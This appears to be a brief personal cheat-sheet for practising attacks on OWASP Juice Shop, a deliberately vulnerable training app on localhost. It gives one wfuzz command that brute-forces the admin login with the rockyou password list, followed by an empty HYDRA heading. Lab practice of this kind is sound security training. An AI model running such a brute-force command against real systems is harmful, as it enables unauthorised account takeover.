# WFUZZ

Basic command: ``wfuzz -u http://localhost:3000/rest/user/login -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -H "Content-Type: application/json" -w /usr/share/wordlists/rockyou.txt``


# HYDRA